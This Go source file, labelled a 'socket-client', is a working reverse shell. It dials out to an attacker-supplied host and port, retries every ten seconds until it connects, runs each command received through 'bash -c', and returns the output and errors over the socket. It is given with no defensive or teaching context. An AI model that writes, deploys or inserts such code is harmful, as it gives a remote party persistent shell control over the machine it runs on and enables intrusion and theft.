// socket-client project main.go
package main
import (
        "fmt"
        "net"
		"os"
		"os/exec"
		"bytes"
		"time"
)
const (
        SERVER_TYPE = "tcp"
		ShellToUse = "bash"
)

var (
	SERVER_HOST = os.Args[1]
	SERVER_PORT = os.Args[2]
)


func Shellout(command string) (string, string, error) {
    var stdout bytes.Buffer
    var stderr bytes.Buffer
    cmd := exec.Command(ShellToUse, "-c", command)
    cmd.Stdout = &stdout
    cmd.Stderr = &stderr
    err := cmd.Run()
    return stdout.String(), stderr.String(), err
}


func main() {
        //establish connection
	for {
			connection, err := net.Dial(SERVER_TYPE, SERVER_HOST+":"+SERVER_PORT)
			if err != nil {
				time.Sleep(10 * time.Second) // if failed to connect, wait and try again
				continue
			}
			defer connection.Close()
			buffer := make([]byte, 1024)

			for {
				// Read message (command) from the server
				mLen, err := connection.Read(buffer)
				if err != nil {
					if err.Error() == "EOF" || mLen == 0 {
						break // if connection closed, exit the loop and try connecting again
					}
					// if there is some error getting the command send error message back
					errorMessage := fmt.Sprintf("Error reading: %s", err.Error())
					connection.Write([]byte(errorMessage))
					continue
				}

				command := string(buffer[:mLen])

				if command == "exit" {
					connection.Close()
					os.Exit(0)
				}

				// Execute the command
				out, errout, err := Shellout(command)
				if err != nil {
					fmt.Println("error: %v\n", err) // TIFDI
				}
				if errout == "" {
					errout = "None"
				}
				if out == "" {
					out = "None"
				}

				response := "\nOutput:\n" + out + "\nStd Error:" + errout

				// Send the response back to the server
				_, err = connection.Write([]byte(response))
				if err != nil {
					continue
				}
		}
	}
        
}